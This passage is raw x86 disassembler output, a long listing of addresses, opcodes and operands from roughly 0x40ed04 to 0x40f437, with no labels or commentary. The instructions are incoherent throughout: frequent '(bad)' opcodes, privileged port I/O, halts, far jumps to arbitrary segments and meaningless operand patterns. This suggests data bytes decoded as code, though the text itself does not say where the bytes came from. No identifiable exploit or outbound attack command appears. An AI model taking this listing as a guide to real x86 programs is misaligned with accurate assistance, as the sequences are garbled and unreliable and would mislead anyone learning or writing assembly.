  40ed04:	imul   esp,DWORD PTR [ecx-0x46],0x4d048a96
  40ed0b:	(bad)  
  40ed0c:	cmp    al,0x1a
  40ed0e:	sub    al,0x62
  40ed10:	mov    ebp,0x8a538a60
  40ed15:	bound  esi,QWORD PTR [ebx-0x4f1e9f75]
  40ed1b:	es adc ebp,DWORD PTR ds:[ebx-0x28]
  40ed20:	int3   
  40ed21:	(bad)  
  40ed22:	sub    DWORD PTR [eax+ebp*4],edi
  40ed25:	ins    DWORD PTR es:[edi],dx
  40ed26:	test   BYTE PTR [ebx],al
  40ed28:	and    al,0x31
  40ed2a:	and    DWORD PTR [ebx+0x5cf9798b],esp
  40ed30:	fdivr  DWORD PTR [ecx-0x6c]
  40ed33:	adc    al,0x6
  40ed35:	ds scas al,BYTE PTR es:[edi]
  40ed37:	je     0x40ed51
  40ed39:	mov    al,0x27
  40ed3b:	lock sub eax,0x2cc90f22
  40ed41:	daa    
  40ed42:	mov    ecx,0x7effe838
  40ed47:	les    ecx,FWORD PTR [esi+0x32]
  40ed4a:	cmc    
  40ed4b:	xchg   ebp,eax
  40ed4c:	sub    eax,0xa04b93a
  40ed51:	(bad)
  40ed54:	aas    
  40ed55:	(bad)  
  40ed56:	lock pop edx
  40ed58:	mov    edx,0xc3e9eeb9
  40ed5d:	or     DWORD PTR [edi+0x57],0xffffffaa
  40ed61:	clc    
  40ed62:	jecxz  0x40ecf0
  40ed64:	cmp    al,0xe
  40ed66:	cmp    bl,BYTE PTR [ebx]
  40ed68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed69:	enter  0x3b58,0x5e
  40ed6d:	sub    edx,ebp
  40ed6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed70:	or     BYTE PTR [ebp-0xdff6942],al
  40ed76:	cmp    al,0xc5
  40ed78:	in     al,dx
  40ed79:	lds    edx,FWORD PTR [edi]
  40ed7b:	mov    eax,0x906d3308
  40ed80:	inc    ecx
  40ed81:	loopne 0x40eda1
  40ed83:	add    edi,edi
  40ed85:	jge    0x40ed36
  40ed87:	lock pop edi
  40ed89:	pop    esi
  40ed8a:	pop    esp
  40ed8b:	cdq    
  40ed8c:	in     al,0x3e
  40ed8e:	sbb    eax,0xffd516dd
  40ed93:	fwait
  40ed94:	ja     0x40ed20
  40ed96:	or     ebx,DWORD PTR [edx+0x3e]
  40ed99:	mov    al,0xa6
  40ed9b:	xor    dl,BYTE PTR [esi]
  40ed9d:	ror    BYTE PTR [ecx],0x6
  40eda0:	or     esp,esi
  40eda2:	mov    ebp,0xd54bd473
  40eda7:	xor    eax,0x60e25e51
  40edac:	aaa    
  40edad:	out    dx,eax
  40edae:	sbb    al,0x1a
  40edb0:	sbb    al,0x71
  40edb2:	xor    BYTE PTR [ebx+ebp*1+0x8584284],dh
  40edb9:	cli    
  40edba:	cmp    edx,DWORD PTR [eax]
  40edbc:	xchg   DWORD PTR [edi],ebx
  40edbe:	lods   eax,DWORD PTR ds:[esi]
  40edbf:	push   ds
  40edc0:	xchg   edx,eax
  40edc1:	imul   esp,DWORD PTR [eax-0x76],0x78
  40edc5:	(bad)  
  40edc7:	pop    edi
  40edc8:	dec    esi
  40edc9:	(bad)  
  40edca:	aas    
  40edcb:	stos   DWORD PTR es:[edi],eax
  40edcc:	adc    DWORD PTR [ebp-0x117cdcda],edx
  40edd2:	mov    BYTE PTR ss:[esi+0x3e],dh
  40edd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edd7:	fsub   QWORD PTR [edx-0x2e]
  40edda:	xchg   edx,eax
  40eddb:	mov    eax,0xff57adf5
  40ede0:	fstp   st(0)
  40ede2:	mov    WORD PTR [edx+eiz*2-0x37],fs
  40ede6:	or     BYTE PTR [eax-0x1b],0x1f
  40edea:	std    
  40edeb:	in     al,dx
  40edec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eded:	xor    dh,BYTE PTR gs:[esi]
  40edf0:	sub    BYTE PTR [edi-0x21511d97],cl
  40edf6:	fstp   QWORD PTR [ebx-0x764cc6f0]
  40edfc:	inc    edi
  40edfd:	rcl    esi,cl
  40edff:	jnp    0x40ede0
  40ee01:	inc    edi
  40ee02:	into   
  40ee03:	fisubr WORD PTR [edi-0x72]
  40ee06:	cmp    al,0x53
  40ee08:	mov    dh,0xe0
  40ee0a:	xchg   edi,eax
  40ee0b:	or     ch,dl
  40ee0d:	pop    edi
  40ee0e:	xchg   dh,bh
  40ee10:	mov    ah,0x6
  40ee12:	ds daa 
  40ee14:	call   0x77229b41
  40ee19:	cmc    
  40ee1a:	imul   edx,DWORD PTR [ebp-0xfa584df],0xffffffde
  40ee21:	xchg   DWORD PTR [edx],edx
  40ee23:	mov    eax,0xc2b6a622
  40ee28:	aaa    
  40ee29:	cld    
  40ee2a:	pushf  
  40ee2b:	pop    es
  40ee2c:	fiadd  DWORD PTR [eax+0x462bf88e]
  40ee32:	repnz sbb esp,DWORD PTR [edx]
  40ee35:	(bad)  
  40ee36:	jne    0x40ee14
  40ee38:	or     eax,0x264e835a
  40ee3d:	leave  
  40ee3e:	ret    
  40ee3f:	and    bl,BYTE PTR [ecx]
  40ee41:	jns    0x40eeb8
  40ee43:	mov    esi,0xef61c5c3
  40ee48:	enter  0x94fb,0xf1
  40ee4c:	add    ah,BYTE PTR [ecx+ebx*8]
  40ee4f:	adc    eax,DWORD PTR [ecx]
  40ee51:	push   0xffffffd3
  40ee53:	xor    BYTE PTR [ebx-0x23],al
  40ee56:	cmp    bh,BYTE PTR [ecx-0x6c]
  40ee59:	dec    edi
  40ee5a:	popf   
  40ee5b:	imul   edi,DWORD PTR [ecx],0xe24cfdf8
  40ee61:	test   DWORD PTR [edi+edx*2],edi
  40ee64:	xchg   ecx,eax
  40ee65:	mov    al,ds:0x36980956
  40ee6a:	pmulhuw mm2,QWORD PTR [eax+ebx*1]
  40ee6e:	jae    0x40ee26
  40ee70:	dec    esp
  40ee71:	xlat   BYTE PTR ds:[ebx]
  40ee72:	loope  0x40eee1
  40ee74:	jo     0x40ee81
  40ee76:	or     al,0x4e
  40ee78:	pop    ss
  40ee79:	mov    cl,ah
  40ee7b:	gs push cs
  40ee7d:	fimul  WORD PTR [esi]
  40ee7f:	push   esi
  40ee80:	dec    edx
  40ee81:	fidiv  WORD PTR [eax]
  40ee83:	out    dx,eax
  40ee84:	ins    BYTE PTR es:[edi],dx
  40ee85:	(bad)  
  40ee86:	adc    eax,0xf34db8c0
  40ee8b:	mov    bh,BYTE PTR [eax*1+0x71849feb]
  40ee92:	xor    edx,DWORD PTR [edi-0x39]
  40ee95:	add    al,0xa6
  40ee97:	pop    edx
  40ee98:	ret    0xfc8a
  40ee9b:	lea    ecx,[edi+0x60]
  40ee9e:	or     DWORD PTR [ecx-0x4b],esi
  40eea1:	or     DWORD PTR [edi],ebx
  40eea3:	push   edi
  40eea4:	mov    ds:0xa54f7779,al
  40eea9:	jo     0x40eecb
  40eeab:	mov    ds:0x5080035,eax
  40eeb0:	out    0x24,eax
  40eeb2:	rcl    DWORD PTR [ecx+0x5e0f298e],0x20
  40eeb9:	sti    
  40eeba:	mov    ds:0xde6ddb81,eax
  40eebf:	and    dl,0xbf
  40eec2:	push   cs
  40eec3:	aas    
  40eec4:	xchg   edx,eax
  40eec5:	or     edi,ecx
  40eec7:	mov    eax,0x8f0af42b
  40eecc:	dec    edi
  40eecd:	fs pop ds
  40eecf:	and    edi,DWORD PTR [ecx]
  40eed1:	mov    ch,0x3b
  40eed3:	mov    DWORD PTR ds:0x210cc050,edx
  40eed9:	push   edx
  40eeda:	add    DWORD PTR [esi],0xf5f133cf
  40eee0:	lds    eax,FWORD PTR [ebx]
  40eee2:	es cld 
  40eee4:	loope  0x40eef3
  40eee6:	mov    eax,ds:0x63424d0c
  40eeeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeec:	clc    
  40eeed:	xchg   ebp,eax
  40eeee:	xchg   esi,eax
  40eeef:	xchg   esi,eax
  40eef0:	mov    ecx,eax
  40eef2:	pop    ss
  40eef3:	jno    0x40ef6e
  40eef5:	sub    DWORD PTR [edi+esi*2+0x5d],edx
  40eef9:	outs   dx,DWORD PTR ds:[esi]
  40eefa:	sbb    edx,0x3e05e459
  40ef00:	daa    
  40ef01:	mov    bh,0x40
  40ef03:	add    DWORD PTR [ecx-0x64],eax
  40ef06:	ja     0x40ef85
  40ef08:	or     al,0x2
  40ef0a:	push   ss
  40ef0b:	cmc    
  40ef0c:	test   ax,0x48ed
  40ef10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef11:	push   ss
  40ef12:	mov    edi,0x4ac99bf7
  40ef17:	and    dh,dh
  40ef19:	leave  
  40ef1a:	jo     0x40ee9d
  40ef1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef1d:	rol    BYTE PTR [eax-0x1835357b],0x43
  40ef24:	imul   edi,DWORD PTR [ecx-0x68],0x84bbb2a3
  40ef2b:	push   edi
  40ef2c:	rol    ebp,1
  40ef2e:	mov    ds:0x461ae42f,eax
  40ef33:	inc    ecx
  40ef34:	in     eax,dx
  40ef35:	push   ebx
  40ef36:	and    esp,esp
  40ef38:	jns    0x40ef9d
  40ef3a:	fisubr WORD PTR [ebx-0xd]
  40ef3d:	mov    al,0xf2
  40ef3f:	retf   
  40ef40:	jecxz  0x40ef80
  40ef42:	cmp    al,0xd0
  40ef44:	lea    ebp,[eax-0x1e55d063]
  40ef4a:	aam    0xcd
  40ef4c:	add    eax,0x6b04718e
  40ef51:	fst    DWORD PTR [edx+esi*8-0x348286c1]
  40ef58:	cli    
  40ef59:	xor    BYTE PTR [edi+0x494b0a54],bl
  40ef5f:	pop    eax
  40ef60:	mov    edi,0x5563acdb
  40ef65:	fistp  WORD PTR [ebp+esi*2-0x629a87ba]
  40ef6c:	pop    ecx
  40ef6d:	repz xchg edi,eax
  40ef6f:	pushf  
  40ef70:	iret   
  40ef71:	ror    DWORD PTR [edi-0x3f90bd91],cl
  40ef77:	mov    bl,0x79
  40ef79:	mov    al,0x8f
  40ef7b:	cdq    
  40ef7c:	in     eax,0xe1
  40ef7e:	and    esi,edx
  40ef80:	test   eax,0x39617f52
  40ef85:	pop    esi
  40ef86:	popa   
  40ef87:	and    DWORD PTR [edi],ebx
  40ef89:	xor    DWORD PTR [ebx],0x3e
  40ef8c:	or     DWORD PTR [edi+ebx*8-0x6c],esi
  40ef90:	sbb    DWORD PTR [edi-0x3fad30aa],edx
  40ef96:	mov    al,0x38
  40ef98:	je     0x40ef2a
  40ef9a:	sbb    BYTE PTR [esp+edi*4+0x23],ah
  40ef9e:	(bad)  
  40ef9f:	call   FWORD PTR [esi+ebp*8]
  40efa2:	(bad)  
  40efa3:	js     0x40efdc
  40efa5:	data16 cld 
  40efa7:	mov    bl,0x20
  40efa9:	cmp    BYTE PTR [ebp-0x4c],ah
  40efac:	xchg   BYTE PTR [ebx+0x47],al
  40efaf:	jecxz  0x40ef38
  40efb1:	imul   eax,esi,0x5433c2bb
  40efb7:	(bad)
  40efbb:	pop    ebx
  40efbc:	sub    al,0x95
  40efbe:	in     al,0xf5
  40efc0:	sti    
  40efc1:	repz xchg ecx,eax
  40efc3:	inc    esi
  40efc4:	outs   dx,BYTE PTR ds:[esi]
  40efc5:	or     al,0xf4
  40efc7:	sub    BYTE PTR [esi-0x4117255d],ch
  40efcd:	aaa    
  40efce:	pop    esi
  40efcf:	push   esi
  40efd0:	lea    edi,[edi]
  40efd2:	mov    al,ds:0x7a06ea8f
  40efd7:	sub    eax,0x97cc6dbf
  40efdc:	sub    DWORD PTR [eax],ebp
  40efde:	out    dx,eax
  40efdf:	xchg   DWORD PTR [esp+ecx*1+0x46],ebx
  40efe3:	aam    0xdf
  40efe5:	mov    al,ds:0x6e817640
  40efea:	lock sub bh,ch
  40efed:	add    BYTE PTR [eax],dh
  40efef:	push   ss
  40eff0:	fmul   DWORD PTR ds:0x84194fa6
  40eff6:	mov    edi,0x137a9fc4
  40effb:	dec    esi
  40effc:	push   0x7fe57b
  40f001:	imul   edi,ecx,0xfffffffc
  40f004:	add    dh,BYTE PTR [ebx]
  40f006:	dec    ebp
  40f007:	test   BYTE PTR [eax],bh
  40f009:	dec    esp
  40f00a:	adc    al,0x92
  40f00c:	push   edx
  40f00d:	xchg   al,cl
  40f00f:	inc    ebx
  40f010:	xchg   edi,eax
  40f011:	outs   dx,BYTE PTR ds:[esi]
  40f012:	jbe    0x40efbd
  40f014:	ficom  WORD PTR [edx]
  40f016:	scas   al,BYTE PTR es:[edi]
  40f017:	hlt    
  40f018:	xchg   ebp,eax
  40f019:	xchg   esp,eax
  40f01a:	mov    BYTE PTR [ebx+edi*2],ah
  40f01d:	mov    ds:0x69b4ba58,eax
  40f022:	fwait
  40f023:	mov    al,ds:0x39012408
  40f028:	or     BYTE PTR [ebx],al
  40f02a:	lods   al,BYTE PTR ds:[esi]
  40f02b:	addr16 or al,0xe5
  40f02e:	das    
  40f02f:	lods   eax,DWORD PTR ds:[esi]
  40f030:	mov    al,ds:0xe5564d33
  40f035:	xchg   ebx,eax
  40f036:	xchg   edx,eax
  40f037:	pop    edx
  40f038:	outs   dx,BYTE PTR ds:[esi]
  40f039:	repz sahf 
  40f03b:	repnz test eax,0x6fe6c0f4
  40f041:	call   0xdcf5:0x12a86243
  40f048:	jmp    0x786d:0xdeee9b20
  40f04f:	sub    BYTE PTR [ecx],bh
  40f051:	adc    BYTE PTR [ebp+0x734d9b65],bh
  40f057:	ins    BYTE PTR es:[edi],dx
  40f058:	arpl   WORD PTR [edi-0x9a42b5d],bp
  40f05e:	into   
  40f05f:	aas    
  40f060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f061:	dec    esi
  40f062:	and    ch,BYTE PTR [ecx+0x72]
  40f065:	sub    al,0x56
  40f067:	pop    ss
  40f068:	xchg   ecx,eax
  40f069:	mov    ds,WORD PTR [esi+0xc]
  40f06c:	out    dx,al
  40f06d:	and    esp,DWORD PTR [edx+0x35]
  40f070:	jo     0x40f053
  40f072:	shl    BYTE PTR [esi-0x7926cc69],1
  40f078:	cmp    ah,dh
  40f07a:	(bad)  
  40f07c:	aas    
  40f07d:	pop    ebp
  40f07e:	cld    
  40f07f:	jb     0x40f00e
  40f081:	jmp    0x40f0c2
  40f083:	push   edi
  40f084:	push   ds
  40f085:	out    0x62,al
  40f087:	test   al,0x6f
  40f089:	mov    al,0x41
  40f08b:	loopne 0x40f0ab
  40f08d:	stos   DWORD PTR es:[edi],eax
  40f08e:	inc    esp
  40f08f:	mov    DWORD PTR [ecx+eiz*4-0x2f1f5040],ebp
  40f096:	pushf  
  40f097:	dec    ecx
  40f098:	pop    es
  40f099:	pop    ecx
  40f09a:	sbb    DWORD PTR [esi-0x56],eax
  40f09d:	push   es
  40f09e:	loop   0x40f029
  40f0a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a1:	daa    
  40f0a2:	stos   BYTE PTR es:[edi],al
  40f0a3:	fimul  WORD PTR ds:0x36e5f06b
  40f0a9:	mov    ecx,0x39222a26
  40f0ae:	js     0x40f07c
  40f0b0:	and    al,0xef
  40f0b2:	add    DWORD PTR [edx+0x40772fc7],eax
  40f0b8:	pop    esi
  40f0b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0bb:	scas   al,BYTE PTR es:[edi]
  40f0bc:	pop    edi
  40f0bd:	and    cl,0x75
  40f0c0:	mov    ds:0xe5d06f90,al
  40f0c5:	lods   al,BYTE PTR ds:[esi]
  40f0c6:	clc    
  40f0c7:	jno    0x40f115
  40f0c9:	mov    dl,0x94
  40f0cb:	adc    edx,DWORD PTR [eax]
  40f0cd:	pop    es
  40f0ce:	xrelease xchg BYTE PTR [ecx+0x52],dh
  40f0d2:	fdecstp 
  40f0d4:	aad    0x14
  40f0d6:	cmc    
  40f0d7:	cmp    DWORD PTR [eax+0xa5f343b],esp
  40f0dd:	xchg   ecx,eax
  40f0de:	and    BYTE PTR [eax],ah
  40f0e0:	loop   0x40f0df
  40f0e2:	adc    BYTE PTR [edi+0x43],al
  40f0e5:	cli    
  40f0e6:	ja     0x40f0a0
  40f0e8:	mov    edi,0xce4c7139
  40f0ed:	imul   esp,DWORD PTR [ecx-0x30],0x1f300e9b
  40f0f4:	hlt    
  40f0f5:	or     edx,ecx
  40f0f7:	icebp  
  40f0f8:	pop    es
  40f0f9:	loop   0x40f113
  40f0fb:	test   DWORD PTR [eax+0x9],ecx
  40f0fe:	and    DWORD PTR [edx-0xeb7eca6],ecx
  40f104:	xor    eax,0x9f697256
  40f109:	jae    0x40f142
  40f10b:	and    DWORD PTR [eax-0x18],ebp
  40f10e:	xor    bh,BYTE PTR [ebp+ebp*8-0x6a]
  40f112:	add    al,0xda
  40f114:	cmp    bl,al
  40f116:	es inc ebx
  40f118:	sub    eax,0x5f38e109
  40f11d:	dec    ecx
  40f11e:	sub    ah,BYTE PTR [eax]
  40f120:	aam    0xd0
  40f122:	(bad)  
  40f123:	in     al,dx
  40f124:	dec    BYTE PTR [edx+0x7d7ce2fc]
  40f12a:	push   esi
  40f12b:	jmp    0xdc85:0xd3f2f184
  40f132:	aas    
  40f133:	cli    
  40f134:	repnz sub ch,dh
  40f137:	daa    
  40f138:	icebp  
  40f139:	adc    cl,BYTE PTR [ecx+0x13]
  40f13c:	push   ebx
  40f13d:	pop    ss
  40f13e:	pushf  
  40f13f:	and    eax,0x9c2955a2
  40f144:	mov    esi,0xffe5617e
  40f14a:	xchg   ecx,eax
  40f14b:	mov    ds,WORD PTR [eax]
  40f14d:	or     eax,0x504b241b
  40f152:	(bad)  
  40f154:	jno    0x40f1c5
  40f156:	les    esp,FWORD PTR [ebp+0x56650b07]
  40f15c:	(bad)  
  40f15d:	push   edi
  40f15e:	mov    ah,0x18
  40f160:	lahf   
  40f161:	int    0xf6
  40f163:	es xchg edi,eax
  40f165:	push   eax
  40f166:	sti    
  40f167:	in     eax,dx
  40f168:	xor    ch,bl
  40f16a:	mov    cl,0xac
  40f16c:	pop    edx
  40f16d:	pop    esi
  40f16e:	mov    esp,ebp
  40f170:	(bad)  
  40f171:	rol    ch,1
  40f173:	pop    edi
  40f174:	jg     0x40f115
  40f176:	add    edi,esp
  40f178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f179:	int3   
  40f17a:	sub    ebp,edi
  40f17c:	arpl   WORD PTR [ecx],si
  40f17e:	clc    
  40f17f:	jmp    0x6a53a34
  40f184:	aas    
  40f185:	dec    edi
  40f186:	dec    edx
  40f187:	adc    al,0xe9
  40f189:	jno    0x40f132
  40f18b:	aas    
  40f18c:	dec    eax
  40f18d:	xchg   ebp,eax
  40f18e:	hlt    
  40f18f:	xchg   esi,eax
  40f190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f191:	fistp  QWORD PTR [edx]
  40f193:	hlt    
  40f194:	outs   dx,DWORD PTR ds:[esi]
  40f195:	sahf   
  40f196:	fiadd  WORD PTR [esi-0x57]
  40f199:	jnp    0x40f140
  40f19b:	test   eax,0x4d6f6edd
  40f1a0:	mov    edi,0xb3bc30bf
  40f1a5:	xchg   edi,eax
  40f1a6:	push   ecx
  40f1a7:	call   0xef932536
  40f1ac:	fild   DWORD PTR [ebx]
  40f1ae:	dec    eax
  40f1af:	inc    ecx
  40f1b0:	adc    DWORD PTR [ebp+0x6a],0x1d
  40f1b4:	or     si,WORD PTR [eax-0x1d]
  40f1b8:	pop    ebp
  40f1b9:	jmp    0xc9889497
  40f1be:	imul   ebx,DWORD PTR cs:[esi],0xae71f865
  40f1c5:	lock sub edx,DWORD PTR [edi+0x2a8a3ba]
  40f1cc:	nop
  40f1cd:	cld    
  40f1ce:	enter  0xb95f,0x24
  40f1d2:	adc    dh,bh
  40f1d4:	mov    ebx,0x61fac10e
  40f1d9:	mov    eax,0xba05a3de
  40f1de:	xchg   esi,eax
  40f1df:	fsubr  DWORD PTR [eax-0x588b7fe5]
  40f1e5:	xchg   ecx,eax
  40f1e6:	sub    BYTE PTR [ebp-0x6f269d8e],dl
  40f1ec:	inc    ebp
  40f1ed:	sar    ecx,1
  40f1ef:	ja     0x40f1cb
  40f1f1:	ror    BYTE PTR [eax-0x25652a33],cl
  40f1f7:	jge    0x40f20b
  40f1f9:	shl    DWORD PTR [esp+ebx*1],0x88
  40f1fd:	pop    esi
  40f1fe:	aas    
  40f1ff:	test   BYTE PTR [edi],ch
  40f201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f202:	adc    DWORD PTR [ebp+0x18],eax
  40f205:	sub    eax,0xb7862d63
  40f20a:	mov    ebx,edx
  40f20c:	mov    eax,0x60a6fdf
  40f211:	xchg   ecx,eax
  40f212:	mov    ebx,0xed78e771
  40f217:	sbb    eax,0x66afc271
  40f21c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f21d:	out    dx,al
  40f21e:	ins    BYTE PTR es:[edi],dx
  40f21f:	hlt    
  40f220:	inc    ebx
  40f221:	adc    BYTE PTR [esi+0x66],dh
  40f224:	sub    eax,0xdcb6a3eb
  40f229:	xchg   DWORD PTR [ecx-0x4396639a],ecx
  40f22f:	cdq    
  40f230:	jecxz  0x40f291
  40f232:	fadd   QWORD PTR [edi-0x5e409c73]
  40f238:	push   ds
  40f239:	lods   eax,DWORD PTR ds:[esi]
  40f23a:	lahf   
  40f23b:	mov    BYTE PTR [ecx+ebx*2-0x79b99303],dl
  40f242:	(bad)  [edx+0x48408a4c]
  40f248:	(bad)  
  40f249:	int3   
  40f24a:	int    0x55
  40f24c:	inc    ebx
  40f24d:	ins    BYTE PTR es:[edi],dx
  40f24e:	inc    esi
  40f24f:	adc    ecx,esi
  40f251:	loopne 0x40f222
  40f253:	fdivrp st(1),st
  40f255:	xchg   edx,eax
  40f256:	or     BYTE PTR [ebp+0x72],bl
  40f259:	test   al,0x95
  40f25b:	loopne 0x40f2cb
  40f25d:	inc    esi
  40f25e:	pop    esi
  40f25f:	jno    0x40f279
  40f261:	sub    al,BYTE PTR [esp+edi*8]
  40f264:	or     eax,DWORD PTR [edx+ecx*2+0x5ce5159b]
  40f26b:	gs mov ebx,ecx
  40f26e:	xchg   ebp,eax
  40f26f:	mov    ds:0x8588438b,al
  40f274:	cmp    eax,0x4cdb06c5
  40f279:	sub    al,BYTE PTR [esi]
  40f27b:	push   0x4c
  40f27d:	es mov dh,0xba
  40f280:	fwait
  40f281:	pop    edx
  40f282:	cld    
  40f283:	ja     0x40f215
  40f285:	pop    DWORD PTR [edx+0x2f]
  40f288:	(bad)  
  40f289:	lods   eax,DWORD PTR ds:[esi]
  40f28a:	xchg   BYTE PTR [ebp-0x8dbca4a],bh
  40f290:	in     al,0x7d
  40f292:	cmp    bh,BYTE PTR [esi]
  40f294:	scas   eax,DWORD PTR es:[edi]
  40f295:	mov    ds:0x5cfab9df,al
  40f29a:	jo     0x40f233
  40f29c:	(bad)  
  40f29d:	clc    
  40f29e:	pop    ebp
  40f29f:	fild   WORD PTR [edi+0x71]
  40f2a2:	pop    eax
  40f2a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2a4:	(bad)  
  40f2a6:	add    ch,BYTE PTR [eax]
  40f2a8:	jg     0x40f2b9
  40f2aa:	lock xor ch,BYTE PTR ds:0x10cf69e6
  40f2b1:	js     0x40f2de
  40f2b3:	pop    edx
  40f2b4:	push   eax
  40f2b5:	and    eax,0x368f100b
  40f2ba:	stos   BYTE PTR es:[edi],al
  40f2bb:	(bad)  
  40f2bc:	jmp    0xfe9f:0x30f6c62
  40f2c3:	mov    ds:0xa378399c,eax
  40f2c8:	test   al,0xd3
  40f2ca:	mov    dh,0x8f
  40f2cc:	push   esp
  40f2cd:	cld    
  40f2ce:	xchg   ebp,eax
  40f2cf:	pusha  
  40f2d0:	test   eax,0x272b24bd
  40f2d5:	loop   0x40f2dd
  40f2d7:	lods   eax,DWORD PTR ds:[esi]
  40f2d8:	push   esp
  40f2d9:	push   0xb594923a
  40f2de:	jg     0x40f30a
  40f2e0:	in     al,0xc2
  40f2e2:	mov    DWORD PTR [esi+ebx*4+0x79],0x35e8e3e5
  40f2ea:	inc    esi
  40f2eb:	lods   eax,DWORD PTR ds:[esi]
  40f2ec:	imul   ebx,DWORD PTR [esi],0x979f0ae9
  40f2f2:	popf   
  40f2f3:	mov    ah,BYTE PTR [ebx]
  40f2f5:	adc    al,0x38
  40f2f7:	loope  0x40f352
  40f2f9:	test   eax,0x939599d6
  40f2fe:	xor    eax,0x11543b23
  40f303:	pop    ebx
  40f304:	inc    ecx
  40f305:	sar    BYTE PTR [ebp+esi*2-0x79f6dccb],1
  40f30c:	xor    ebp,DWORD PTR [ebx]
  40f30e:	popf   
  40f30f:	inc    edx
  40f310:	jmp    0x2e8eb4ea
  40f315:	cmp    eax,0xef60e656
  40f31a:	xchg   esi,eax
  40f31b:	pop    ebx
  40f31c:	inc    esi
  40f31d:	test   DWORD PTR [edx+0x1d9d1434],edi
  40f323:	lods   eax,DWORD PTR ds:[esi]
  40f324:	call   0xd1bd:0xf769f2c5
  40f32b:	jl     0x40f340
  40f32d:	(bad)  
  40f32e:	fwait
  40f32f:	mov    ebp,0xecc70559
  40f334:	adc    eax,0xe602a5e
  40f339:	sbb    DWORD PTR [ebp-0x5f0b74a4],ecx
  40f33f:	icebp  
  40f340:	lods   eax,DWORD PTR ds:[esi]
  40f341:	out    0xc1,eax
  40f343:	shr    ebx,1
  40f345:	mov    DWORD PTR [esi],esi
  40f347:	jnp    0x40f3a2
  40f349:	mov    dl,0x81
  40f34b:	loope  0x40f2d9
  40f34d:	in     eax,0x39
  40f34f:	out    dx,eax
  40f350:	je     0x40f359
  40f352:	dec    edx
  40f353:	bndldx bnd3,[esi]
  40f356:	adc    ebx,DWORD PTR [ebx]
  40f358:	sub    DWORD PTR [esi-0x50],esi
  40f35b:	retf   
  40f35c:	xlat   BYTE PTR ds:[ebx]
  40f35e:	pop    ecx
  40f35f:	pop    ebx
  40f360:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40f362:	xor    dh,BYTE PTR [esi+0x662f40]
  40f368:	pop    ss
  40f369:	sar    DWORD PTR [edi],1
  40f36b:	add    dh,al
  40f36d:	pusha  
  40f36e:	mov    eax,ds:0xcec480
  40f373:	(bad)  
  40f374:	into   
  40f375:	xor    al,0x12
  40f377:	loopne 0x40f3d1
  40f379:	cmp    ecx,DWORD PTR [ebp-0x76917da3]
  40f37f:	mov    DWORD PTR [eax],0xad2321c4
  40f385:	push   0xffffffa4
  40f387:	inc    ecx
  40f388:	dec    edx
  40f389:	push   esp
  40f38a:	jne    0x40f3cb
  40f38c:	jecxz  0x40f338
  40f38e:	jae    0x40f3c9
  40f390:	test   al,0xbe
  40f392:	xchg   ebx,eax
  40f393:	pop    ss
  40f394:	cwde   
  40f395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f396:	and    eax,0xb0463886
  40f39b:	ja     0x40f35a
  40f39d:	add    cl,bh
  40f39f:	inc    esp
  40f3a0:	sub    ebx,DWORD PTR [edi]
  40f3a2:	mov    dl,0x52
  40f3a4:	jbe    0x40f36b
  40f3a6:	les    ebx,FWORD PTR [ebp-0x3454c760]
  40f3ac:	mov    edx,0x3d8a5dbb
  40f3b1:	outs   dx,BYTE PTR ds:[esi]
  40f3b2:	clc    
  40f3b3:	imul   edx,DWORD PTR [ebp-0x4],0x44
  40f3b7:	lahf   
  40f3b8:	repnz mov gs,WORD PTR [esi+eax*2]
  40f3bc:	fnstcw WORD PTR [ebp-0x6d817a7d]
  40f3c2:	mov    edx,0x2f45dd96
  40f3c7:	adc    eax,DWORD PTR [eax+eiz*8]
  40f3ca:	pop    eax
  40f3cb:	jmp    0x40f445
  40f3cd:	enter  0x6bb1,0x8d
  40f3d1:	cdq    
  40f3d2:	retf   0xe8d7
  40f3d5:	test   BYTE PTR [esi+0x7c5a9c75],dl
  40f3db:	(bad)  
  40f3dd:	push   edi
  40f3de:	int    0xea
  40f3e0:	inc    ebp
  40f3e1:	in     eax,0xeb
  40f3e3:	pop    es
  40f3e4:	test   BYTE PTR [ecx-0x31],ch
  40f3e7:	retf   0x6724
  40f3ea:	add    esi,DWORD PTR [ecx]
  40f3ec:	pop    edx
  40f3ed:	and    BYTE PTR [ebp-0x7e3ca01],cl
  40f3f3:	clc    
  40f3f4:	mov    ds,WORD PTR [edx-0x61]
  40f3f7:	cmp    bh,BYTE PTR [eax+0x1f]
  40f3fa:	out    dx,eax
  40f3fb:	in     al,dx
  40f3fc:	loop   0x40f454
  40f3fe:	xchg   BYTE PTR [edi+ebp*4],bh
  40f401:	jle    0x40f455
  40f403:	mov    ah,0x50
  40f405:	add    eax,0xc75d4aa1
  40f40a:	(bad)  
  40f40b:	adc    DWORD PTR [ebp-0xd297870],esi
  40f411:	and    DWORD PTR [eax],ebp
  40f413:	mov    ds:0xfb0084f5,eax
  40f418:	sbb    esp,DWORD PTR [eax]
  40f41a:	into   
  40f41b:	sbb    bl,BYTE PTR [ecx+0x74]
  40f41e:	out    0x30,eax
  40f420:	push   cs
  40f421:	jl     0x40f3a4
  40f423:	rol    DWORD PTR [esi-0x12],0xd2
  40f427:	cmp    edx,DWORD PTR [eax+0x6b]
  40f42a:	and    al,0xf4
  40f42c:	adc    DWORD PTR [esi],ebx
  40f42e:	imul   edi,DWORD PTR [edi+ecx*1],0x1fc52f8e
  40f435:	pop    ebx
  40f436:	out    dx,eax
  40f437:	and    eax,0x53d810c5
